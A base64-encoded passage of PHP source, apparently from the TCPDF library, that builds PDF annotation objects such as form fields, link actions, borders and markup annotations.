lmIChpc3NldCgkZGF0YVsna2lkJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnICcuJGRhdGFbJ2tpZCddLicgMCBSJzsKCQkJCQkJCQlpZiAoJGRhdGFbJ2RlZiddICE9PSAnT2ZmJykgewoJCQkJCQkJCQkkZGVmdmFsID0gJGRhdGFbJ2RlZiddOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQkkYW5ub3RzIC49ICcgXSc7CgkJCQkJCWlmICghZW1wdHkoJGRlZnZhbCkpIHsKCQkJCQkJCSRhbm5vdHMgLj0gJyAvViAvJy4kZGVmdmFsOwoJCQkJCQl9CgkJCQkJCSRhbm5vdHMgLj0gJyA+Pic7CgkJCQkJCSR0aGlzLT5fb3V0KCR0aGlzLT5fZ2V0b2JqKCRyYWRpb19idXR0b25fb2JqX2lkKS4iXG4iLiRhbm5vdHMuIlxuIi4nZW5kb2JqJyk7CgkJCQkJCSR0aGlzLT5mb3JtX29ial9pZFtdID0gJHJhZGlvX2J1dHRvbl9vYmpfaWQ7CgkJCQkJCS8vIHN0b3JlIG9iamVjdCBpZCB0byBiZSB1c2VkIG9uIFBhcmVudCBlbnRyeSBvZiBLaWRzCgkJCQkJCSR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJG5dWyRwbFsndHh0J11dID0gJHJhZGlvX2J1dHRvbl9vYmpfaWQ7CgkJCQkJfQoJCQkJCSRmb3JtZmllbGQgPSBmYWxzZTsKCQkJCQkkcGxbJ29wdCddID0gYXJyYXlfY2hhbmdlX2tleV9jYXNlKCRwbFsnb3B0J10sIENBU0VfTE9XRVIpOwoJCQkJCSRhID0gJHBsWyd4J10gKiAkdGhpcy0+azsKCQkJCQkkYiA9ICR0aGlzLT5wYWdlZGltWyRuXVsnaCddIC0gKCgkcGxbJ3knXSArICRwbFsnaCddKSAqICR0aGlzLT5rKTsKCQkJCQkkYyA9ICRwbFsndyddICogJHRoaXMtPms7CgkJCQkJJGQgPSAkcGxbJ2gnXSAqICR0aGlzLT5rOwoJCQkJCSRyZWN0ID0gc3ByaW50ZignJUYgJUYgJUYgJUYnLCAkYSwgJGIsICRhKyRjLCAkYiskZCk7CgkJCQkJLy8gY3JlYXRlIG5ldyBhbm5vdGF0aW9uIG9iamVjdAoJCQkJCSRhbm5vdHMgPSAnPDwvVHlwZSAvQW5ub3QnOwoJCQkJCSRhbm5vdHMgLj0gJyAvU3VidHlwZSAvJy4kcGxbJ29wdCddWydzdWJ0eXBlJ107CgkJCQkJJGFubm90cyAuPSAnIC9SZWN0IFsnLiRyZWN0LiddJzsKCQkJCQkkZnQgPSBhcnJheSgnQnRuJywgJ1R4JywgJ0NoJywgJ1NpZycpOwoJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydmdCddKSBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnZnQnXSwgJGZ0KSkgewoJCQkJCQkkYW5ub3RzIC49ICcgL0ZUIC8nLiRwbFsnb3B0J11bJ2Z0J107CgkJCQkJCSRmb3JtZmllbGQgPSB0cnVlOwoJCQkJCX0KCQkJCQlpZiAoJHBsWydvcHQnXVsnc3VidHlwZSddICE9PSAnTGluaycpIHsKCQkJCQkJJGFubm90cyAuPSAnIC9Db250ZW50cyAnLiR0aGlzLT5fdGV4dHN0cmluZygkcGxbJ3R4dCddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQl9CgkJCQkJJGFubm90cyAuPSAnIC9QICcuJHRoaXMtPnBhZ2Vfb2JqX2lkWyRuXS4nIDAgUic7CgkJCQkJJGFubm90cyAuPSAnIC9OTSAnLiR0aGlzLT5fZGF0YXN0cmluZyhzcHJpbnRmKCclMDR1LSUwNHUnLCAkbiwgJGtleSksICRhbm5vdF9vYmpfaWQpOwoJCQkJCSRhbm5vdHMgLj0gJyAvTSAnLiR0aGlzLT5fZGF0ZXN0cmluZygkYW5ub3Rfb2JqX2lkLCAkdGhpcy0+ZG9jX21vZGlmaWNhdGlvbl90aW1lc3RhbXApOwoJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydmJ10pKSB7CgkJCQkJCSRmdmFsID0gMDsKCQkJCQkJaWYgKGlzX2FycmF5KCRwbFsnb3B0J11bJ2YnXSkpIHsKCQkJCQkJCWZvcmVhY2ggKCRwbFsnb3B0J11bJ2YnXSBhcyAkZikgewoJCQkJCQkJCXN3aXRjaCAoc3RydG9sb3dlcigkZikpIHsKCQkJCQkJCQkJY2FzZSAnaW52aXNpYmxlJzogewoJCQkJCQkJCQkJJGZ2YWwgKz0gMSA8PCAwOwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnaGlkZGVuJzogewoJCQkJCQkJCQkJJGZ2YWwgKz0gMSA8PCAxOwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAncHJpbnQnOiB7CgkJCQkJCQkJCQkkZnZhbCArPSAxIDw8IDI7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdub3pvb20nOiB7CgkJCQkJCQkJCQkkZnZhbCArPSAxIDw8IDM7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQljYXNlICdub3JvdGF0ZSc6IHsKCQkJCQkJCQkJCSRmdmFsICs9IDEgPDwgNDsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ25vdmlldyc6IHsKCQkJCQkJCQkJCSRmdmFsICs9IDEgPDwgNTsKCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWNhc2UgJ3JlYWRvbmx5JzogewoJCQkJCQkJCQkJJGZ2YWwgKz0gMSA8PCA2OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnbG9ja2VkJzogewoJCQkJCQkJCQkJJGZ2YWwgKz0gMSA8PCA3OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAndG9nZ2xlbm92aWV3JzogewoJCQkJCQkJCQkJJGZ2YWwgKz0gMSA8PCA4OwoJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCX0KCQkJCQkJCQkJY2FzZSAnbG9ja2VkY29udGVudHMnOiB7CgkJCQkJCQkJCQkkZnZhbCArPSAxIDw8IDk7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCQlkZWZhdWx0OiB7CgkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRmdmFsID0gaW50dmFsKCRwbFsnb3B0J11bJ2YnXSk7CgkJCQkJCX0KCQkJCQl9IGVsc2UgewoJCQkJCQkkZnZhbCA9IDQ7CgkJCQkJfQoJCQkJCWlmICgkdGhpcy0+cGRmYV9tb2RlKSB7CgkJCQkJCS8vIGZvcmNlIHByaW50IGZsYWcgZm9yIFBERi9BIG1vZGUKCQkJCQkJJGZ2YWwgfD0gNDsKCQkJCQl9CgkJCQkJJGFubm90cyAuPSAnIC9GICcuaW50dmFsKCRmdmFsKTsKCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnYXMnXSkgQU5EIGlzX3N0cmluZygkcGxbJ29wdCddWydhcyddKSkgewoJCQkJCQkkYW5ub3RzIC49ICcgL0FTIC8nLiRwbFsnb3B0J11bJ2FzJ107CgkJCQkJfQoJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydhcCddKSkgewoJCQkJCQkvLyBhcHBlYXJhbmNlIHN0cmVhbQoJCQkJCQkkYW5ub3RzIC49ICcgL0FQIDw8JzsKCQkJCQkJaWYgKGlzX2FycmF5KCRwbFsnb3B0J11bJ2FwJ10pKSB7CgkJCQkJCQlmb3JlYWNoICgkcGxbJ29wdCddWydhcCddIGFzICRhcG1vZGUgPT4gJGFwZGVmKSB7CgkJCQkJCQkJLy8gJGFwbW9kZSBjYW4gYmU6IG4gPSBub3JtYWw7IHIgPSByb2xsb3ZlcjsgZCA9IGRvd247CgkJCQkJCQkJJGFubm90cyAuPSAnIC8nLnN0cnRvdXBwZXIoJGFwbW9kZSk7CgkJCQkJCQkJaWYgKGlzX2FycmF5KCRhcGRlZikpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIDw8JzsKCQkJCQkJCQkJZm9yZWFjaCAoJGFwZGVmIGFzICRhcHN0YXRlID0+ICRzdHJlYW0pIHsKCQkJCQkJCQkJCS8vIHJlZmVyZW5jZSB0byBYT2JqZWN0IHRoYXQgZGVmaW5lIHRoZSBhcHBlYXJhbmNlIGZvciB0aGlzIG1vZGUtc3RhdGUKCQkJCQkJCQkJCSRhcHNvYmppZCA9ICR0aGlzLT5fcHV0QVBYT2JqZWN0KCRjLCAkZCwgJHN0cmVhbSk7CgkJCQkJCQkJCQkkYW5ub3RzIC49ICcgLycuJGFwc3RhdGUuJyAnLiRhcHNvYmppZC4nIDAgUic7CgkJCQkJCQkJCX0KCQkJCQkJCQkJJGFubm90cyAuPSAnID4+JzsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkvLyByZWZlcmVuY2UgdG8gWE9iamVjdCB0aGF0IGRlZmluZSB0aGUgYXBwZWFyYW5jZSBmb3IgdGhpcyBtb2RlCgkJCQkJCQkJCSRhcHNvYmppZCA9ICR0aGlzLT5fcHV0QVBYT2JqZWN0KCRjLCAkZCwgJGFwZGVmKTsKCQkJCQkJCQkJJGFubm90cyAuPSAnICcuJGFwc29iamlkLicgMCBSJzsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkYW5ub3RzIC49ICRwbFsnb3B0J11bJ2FwJ107CgkJCQkJCX0KCQkJCQkJJGFubm90cyAuPSAnID4+JzsKCQkJCQl9CgkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2JzJ10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnYnMnXSkpKSB7CgkJCQkJCSRhbm5vdHMgLj0gJyAvQlMgPDwnOwoJCQkJCQkkYW5ub3RzIC49ICcgL1R5cGUgL0JvcmRlcic7CgkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydicyddWyd3J10pKSB7CgkJCQkJCQkkYW5ub3RzIC49ICcgL1cgJy5pbnR2YWwoJHBsWydvcHQnXVsnYnMnXVsndyddKTsKCQkJCQkJfQoJCQkJCQkkYnN0eWxlcyA9IGFycmF5KCdTJywgJ0QnLCAnQicsICdJJywgJ1UnKTsKCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2JzJ11bJ3MnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ2JzJ11bJ3MnXSwgJGJzdHlsZXMpKSB7CgkJCQkJCQkkYW5ub3RzIC49ICcgL1MgLycuJHBsWydvcHQnXVsnYnMnXVsncyddOwoJCQkJCQl9CgkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydicyddWydkJ10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnYnMnXVsnZCddKSkpIHsKCQkJCQkJCSRhbm5vdHMgLj0gJyAvRCBbJzsKCQkJCQkJCWZvcmVhY2ggKCRwbFsnb3B0J11bJ2JzJ11bJ2QnXSBhcyAkY29yZCkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAnLmludHZhbCgkY29yZCk7CgkJCQkJCQl9CgkJCQkJCQkkYW5ub3RzIC49ICddJzsKCQkJCQkJfQoJCQkJCQkkYW5ub3RzIC49ICcgPj4nOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSRhbm5vdHMgLj0gJyAvQm9yZGVyIFsnOwoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnYm9yZGVyJ10pIEFORCAoY291bnQoJHBsWydvcHQnXVsnYm9yZGVyJ10pID49IDMpKSB7CgkJCQkJCQkkYW5ub3RzIC49IGludHZhbCgkcGxbJ29wdCddWydib3JkZXInXVswXSkuJyAnOwoJCQkJCQkJJGFubm90cyAuPSBpbnR2YWwoJHBsWydvcHQnXVsnYm9yZGVyJ11bMV0pLicgJzsKCQkJCQkJCSRhbm5vdHMgLj0gaW50dmFsKCRwbFsnb3B0J11bJ2JvcmRlciddWzJdKTsKCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydib3JkZXInXVszXSkgQU5EIGlzX2FycmF5KCRwbFsnb3B0J11bJ2JvcmRlciddWzNdKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyBbJzsKCQkJCQkJCQlmb3JlYWNoICgkcGxbJ29wdCddWydib3JkZXInXVszXSBhcyAkZGFzaCkgewoJCQkJCQkJCQkkYW5ub3RzIC49IGludHZhbCgkZGFzaCkuJyAnOwoJCQkJCQkJCX0KCQkJCQkJCQkkYW5ub3RzIC49ICddJzsKCQkJCQkJCX0KCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRhbm5vdHMgLj0gJzAgMCAwJzsKCQkJCQkJfQoJCQkJCQkkYW5ub3RzIC49ICddJzsKCQkJCQl9CgkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2JlJ10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnYmUnXSkpKSB7CgkJCQkJCSRhbm5vdHMgLj0gJyAvQkUgPDwnOwoJCQkJCQkkYnN0eWxlcyA9IGFycmF5KCdTJywgJ0MnKTsKCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2JlJ11bJ3MnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ2JlJ11bJ3MnXSwgJGJzdHlsZXMpKSB7CgkJCQkJCQkkYW5ub3RzIC49ICcgL1MgLycuJHBsWydvcHQnXVsnYnMnXVsncyddOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGFubm90cyAuPSAnIC9TIC9TJzsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnYmUnXVsnaSddKSBBTkQgKCRwbFsnb3B0J11bJ2JlJ11bJ2knXSA+PSAwKSBBTkQgKCRwbFsnb3B0J11bJ2JlJ11bJ2knXSA8PSAyKSkgewoJCQkJCQkJJGFubm90cyAuPSAnIC9JICcuc3ByaW50ZignICVGJywgJHBsWydvcHQnXVsnYmUnXVsnaSddKTsKCQkJCQkJfQoJCQkJCQkkYW5ub3RzIC49ICc+Pic7CgkJCQkJfQoJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydjJ10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnYyddKSkgQU5EICFlbXB0eSgkcGxbJ29wdCddWydjJ10pKSB7CgkJCQkJCSRhbm5vdHMgLj0gJyAvQyAnLlRDUERGX0NPTE9SUzo6Z2V0Q29sb3JTdHJpbmdGcm9tQXJyYXkoJHBsWydvcHQnXVsnYyddKTsKCQkJCQl9CgkJCQkJLy8kYW5ub3RzIC49ICcgL1N0cnVjdFBhcmVudCAnOwoJCQkJCS8vJGFubm90cyAuPSAnIC9PQyAnOwoJCQkJCSRtYXJrdXBzID0gYXJyYXkoJ3RleHQnLCAnZnJlZXRleHQnLCAnbGluZScsICdzcXVhcmUnLCAnY2lyY2xlJywgJ3BvbHlnb24nLCAncG9seWxpbmUnLCAnaGlnaGxpZ2h0JywgJ3VuZGVybGluZScsICdzcXVpZ2dseScsICdzdHJpa2VvdXQnLCAnc3RhbXAnLCAnY2FyZXQnLCAnaW5rJywgJ2ZpbGVhdHRhY2htZW50JywgJ3NvdW5kJyk7CgkJCQkJaWYgKGluX2FycmF5KHN0cnRvbG93ZXIoJHBsWydvcHQnXVsnc3VidHlwZSddKSwgJG1hcmt1cHMpKSB7CgkJCQkJCS8vIHRoaXMgaXMgYSBtYXJrdXAgdHlwZQoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsndCddKSBBTkQgaXNfc3RyaW5nKCRwbFsnb3B0J11bJ3QnXSkpIHsKCQkJCQkJCSRhbm5vdHMgLj0gJyAvVCAnLiR0aGlzLT5fdGV4dHN0cmluZygkcGxbJ29wdCddWyd0J10sICRhbm5vdF9vYmpfaWQpOwoJCQkJCQl9CgkJCQkJCS8vJGFubm90cyAuPSAnIC9Qb3B1cCAnOwoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnY2EnXSkpIHsKCQkJCQkJCSRhbm5vdHMgLj0gJyAvQ0EgJy5zcHJpbnRmKCclRicsIGZsb2F0dmFsKCRwbFsnb3B0J11bJ2NhJ10pKTsKCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsncmMnXSkpIHsKCQkJCQkJCSRhbm5vdHMgLj0gJyAvUkMgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHBsWydvcHQnXVsncmMnXSwgJGFubm90X29ial9pZCk7CgkJCQkJCX0KCQkJCQkJJGFubm90cyAuPSAnIC9DcmVhdGlvbkRhdGUgJy4kdGhpcy0+X2RhdGVzdHJpbmcoJGFubm90X29ial9pZCwgJHRoaXMtPmRvY19jcmVhdGlvbl90aW1lc3RhbXApOwoJCQkJCQkvLyRhbm5vdHMgLj0gJyAvSVJUICc7CgkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydzdWJqJ10pKSB7CgkJCQkJCQkkYW5ub3RzIC49ICcgL1N1YmogJy4kdGhpcy0+X3RleHRzdHJpbmcoJHBsWydvcHQnXVsnc3ViaiddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJfQoJCQkJCQkvLyRhbm5vdHMgLj0gJyAvUlQgJzsKCQkJCQkJLy8kYW5ub3RzIC49ICcgL0lUICc7CgkJCQkJCS8vJGFubm90cyAuPSAnIC9FeERhdGEgJzsKCQkJCQl9CgkJCQkJJGxpbmVlbmRpbmdzID0gYXJyYXkoJ1NxdWFyZScsICdDaXJjbGUnLCAnRGlhbW9uZCcsICdPcGVuQXJyb3cnLCAnQ2xvc2VkQXJyb3cnLCAnTm9uZScsICdCdXR0JywgJ1JPcGVuQXJyb3cnLCAnUkNsb3NlZEFycm93JywgJ1NsYXNoJyk7CgkJCQkJLy8gQW5ub3RhdGlvbiB0eXBlcwoJCQkJCXN3aXRjaCAoc3RydG9sb3dlcigkcGxbJ29wdCddWydzdWJ0eXBlJ10pKSB7CgkJCQkJCWNhc2UgJ3RleHQnOiB7CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnb3BlbiddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvT3BlbiAnLiAoc3RydG9sb3dlcigkcGxbJ29wdCddWydvcGVuJ10pID09ICd0cnVlJyA/ICd0cnVlJyA6ICdmYWxzZScpOwoJCQkJCQkJfQoJCQkJCQkJJGljb25zYXBwID0gYXJyYXkoJ0NvbW1lbnQnLCAnSGVscCcsICdJbnNlcnQnLCAnS2V5JywgJ05ld1BhcmFncmFwaCcsICdOb3RlJywgJ1BhcmFncmFwaCcpOwoJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ25hbWUnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ25hbWUnXSwgJGljb25zYXBwKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvTmFtZSAvJy4kcGxbJ29wdCddWyduYW1lJ107CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvTmFtZSAvTm90ZSc7CgkJCQkJCQl9CgkJCQkJCQkkaGFzU3RhdGVNb2RlbCA9IGlzc2V0KCRwbFsnb3B0J11bJ3N0YXRlbW9kZWwnXSk7CgkJCQkJCQkkaGFzU3RhdGUgPSBpc3NldCgkcGxbJ29wdCddWydzdGF0ZSddKTsKCQkJCQkJCSRzdGF0ZW1vZGVscyA9IGFycmF5KCdNYXJrZWQnLCAnUmV2aWV3Jyk7CgkJCQkJCQlpZiAoISRoYXNTdGF0ZU1vZGVsICYmICEkaGFzU3RhdGUpIHsKCQkJCQkJCQlicmVhazsKCQkJCQkJCX0KCQkJCQkJCWlmICgkaGFzU3RhdGVNb2RlbCBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnc3RhdGVtb2RlbCddLCAkc3RhdGVtb2RlbHMpKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9TdGF0ZU1vZGVsIC8nLiRwbFsnb3B0J11bJ3N0YXRlbW9kZWwnXTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJHBsWydvcHQnXVsnc3RhdGVtb2RlbCddID0gJ01hcmtlZCc7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9TdGF0ZU1vZGVsIC8nLiRwbFsnb3B0J11bJ3N0YXRlbW9kZWwnXTsKCQkJCQkJCX0KCQkJCQkJCWlmICgkcGxbJ29wdCddWydzdGF0ZW1vZGVsJ10gPT0gJ01hcmtlZCcpIHsKCQkJCQkJCQkkc3RhdGVzID0gYXJyYXkoJ0FjY2VwdGVkJywgJ1VubWFya2VkJyk7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRzdGF0ZXMgPSBhcnJheSgnQWNjZXB0ZWQnLCAnUmVqZWN0ZWQnLCAnQ2FuY2VsbGVkJywgJ0NvbXBsZXRlZCcsICdOb25lJyk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoJGhhc1N0YXRlIEFORCBpbl9hcnJheSgkcGxbJ29wdCddWydzdGF0ZSddLCAkc3RhdGVzKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvU3RhdGUgLycuJHBsWydvcHQnXVsnc3RhdGUnXTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJaWYgKCRwbFsnb3B0J11bJ3N0YXRlbW9kZWwnXSA9PSAnTWFya2VkJykgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL1N0YXRlIC9Vbm1hcmtlZCc7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9TdGF0ZSAvTm9uZSc7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnbGluayc6IHsKCQkJCQkJCWlmIChpc19zdHJpbmcoJHBsWyd0eHQnXSkgJiYgIWVtcHR5KCRwbFsndHh0J10pKSB7CgkJCQkJCQkJaWYgKCRwbFsndHh0J11bMF0gPT0gJyMnKSB7CgkJCQkJCQkJCS8vIGludGVybmFsIGRlc3RpbmF0aW9uCgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvQSA8PC9TIC9Hb1RvIC9EIC8nLlRDUERGX1NUQVRJQzo6ZW5jb2RlTmFtZU9iamVjdChzdWJzdHIoJHBsWyd0eHQnXSwgMSkpLic+Pic7CgkJCQkJCQkJfSBlbHNlaWYgKCRwbFsndHh0J11bMF0gPT0gJyUnKSB7CgkJCQkJCQkJCS8vIGVtYmVkZGVkIFBERiBmaWxlCgkJCQkJCQkJCSRmaWxlbmFtZSA9IGJhc2VuYW1lKHN1YnN0cigkcGxbJ3R4dCddLCAxKSk7CgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvQSA8PCAvUyAvR29Ub0UgL0QgWzAgL0ZpdF0gL05ld1dpbmRvdyB0cnVlIC9UIDw8IC9SIC9DIC9QICcuKCRuIC0gMSkuJyAvQSAnLiR0aGlzLT5lbWJlZGRlZGZpbGVzWyRmaWxlbmFtZV1bJ2EnXS4nID4+ID4+JzsKCQkJCQkJCQl9IGVsc2VpZiAoJHBsWyd0eHQnXVswXSA9PSAnKicpIHsKCQkJCQkJCQkJLy8gZW1iZWRkZWQgZ2VuZXJpYyBmaWxlCgkJCQkJCQkJCSRmaWxlbmFtZSA9IGJhc2VuYW1lKHN1YnN0cigkcGxbJ3R4dCddLCAxKSk7CgkJCQkJCQkJCSRqc2EgPSAndmFyIEQ9ZXZlbnQudGFyZ2V0LmRvYzt2YXIgTXlEYXRhPUQuZGF0YU9iamVjdHM7Zm9yICh2YXIgaSBpbiBNeURhdGEpIGlmIChNeURhdGFbaV0ucGF0aD09IicuJGZpbGVuYW1lLiciKSBELmV4cG9ydERhdGFPYmplY3QoIHsgY05hbWUgOiBNeURhdGFbaV0ubmFtZSwgbkxhdW5jaCA6IDJ9KTsnOwoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL0EgPDwgL1MgL0phdmFTY3JpcHQgL0pTICcuJHRoaXMtPl90ZXh0c3RyaW5nKCRqc2EsICRhbm5vdF9vYmpfaWQpLic+Pic7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJHBhcnNlZFVybCA9IHBhcnNlX3VybCgkcGxbJ3R4dCddKTsKCQkJCQkJCQkJaWYgKGVtcHR5KCRwYXJzZWRVcmxbJ3NjaGVtZSddKSBBTkQgKCFlbXB0eSgkcGFyc2VkVXJsWydwYXRoJ10pICYmIHN0cnRvbG93ZXIoc3Vic3RyKCRwYXJzZWRVcmxbJ3BhdGgnXSwgLTQpKSA9PSAnLnBkZicpKSB7CgkJCQkJCQkJCQkvLyByZWxhdGl2ZSBsaW5rIHRvIGEgUERGIGZpbGUKCQkJCQkJCQkJCSRkZXN0ID0gJ1swIC9GaXRdJzsgLy8gZGVmYXVsdCBwYWdlIDAKCQkJCQkJCQkJCWlmICghZW1wdHkoJHBhcnNlZFVybFsnZnJhZ21lbnQnXSkpIHsKCQkJCQkJCQkJCQkvLyBjaGVjayBmb3IgbmFtZWQgZGVzdGluYXRpb24KCQkJCQkJCQkJCQkkdG1wID0gZXhwbG9kZSgnPScsICRwYXJzZWRVcmxbJ2ZyYWdtZW50J10pOwoJCQkJCQkJCQkJCSRkZXN0ID0gJygnLigoY291bnQoJHRtcCkgPT0gMikgPyAkdG1wWzFdIDogJHRtcFswXSkuJyknOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQkJJGFubm90cyAuPSAnIC9BIDw8L1MgL0dvVG9SIC9EICcuJGRlc3QuJyAvRiAnLiR0aGlzLT5fZGF0YXN0cmluZygkdGhpcy0+dW5odG1sZW50aXRpZXMoJHBhcnNlZFVybFsncGF0aCddKSwgJGFubm90X29ial9pZCkuJyAvTmV3V2luZG93IHRydWU+Pic7CgkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkvLyBleHRlcm5hbCBVUkkgbGluawoJCQkJCQkJCQkJJGFubm90cyAuPSAnIC9BIDw8L1MgL1VSSSAvVVJJICcuJHRoaXMtPl9kYXRhc3RyaW5nKCR0aGlzLT51bmh0bWxlbnRpdGllcygkcGxbJ3R4dCddKSwgJGFubm90X29ial9pZCkuJz4+JzsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+bGlua3NbJHBsWyd0eHQnXV0pKSB7CgkJCQkJCQkJLy8gaW50ZXJuYWwgbGluayBJRAoJCQkJCQkJCSRsID0gJHRoaXMtPmxpbmtzWyRwbFsndHh0J11dOwoJCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZV9vYmpfaWRbKCRsWydwJ10pXSkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSBzcHJpbnRmKCcgL0Rlc3QgWyV1IDAgUiAvWFlaIDAgJUYgbnVsbF0nLCAkdGhpcy0+cGFnZV9vYmpfaWRbKCRsWydwJ10pXSwgKCR0aGlzLT5wYWdlZGltWyRsWydwJ11dWydoJ10gLSAoJGxbJ3knXSAqICR0aGlzLT5rKSkpOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJCSRobW9kZXMgPSBhcnJheSgnTicsICdJJywgJ08nLCAnUCcpOwoJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2gnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ2gnXSwgJGhtb2RlcykpIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL0ggLycuJHBsWydvcHQnXVsnaCddOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL0ggL0knOwoJCQkJCQkJfQoJCQkJCQkJLy8kYW5ub3RzIC49ICcgL1BBICc7CgkJCQkJCQkvLyRhbm5vdHMgLj0gJyAvUXVhZHBvaW50cyAnOwoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnZnJlZXRleHQnOiB7CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnZGEnXSkgQU5EICFlbXB0eSgkcGxbJ29wdCddWydkYSddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvREEgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJHBsWydvcHQnXVsnZGEnXSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsncSddKSBBTkQgKCRwbFsnb3B0J11bJ3EnXSA+PSAwKSBBTkQgKCRwbFsnb3B0J11bJ3EnXSA8PSAyKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvUSAnLmludHZhbCgkcGxbJ29wdCddWydxJ10pOwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ3JjJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9SQyAnLiR0aGlzLT5fdGV4dHN0cmluZygkcGxbJ29wdCddWydyYyddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxb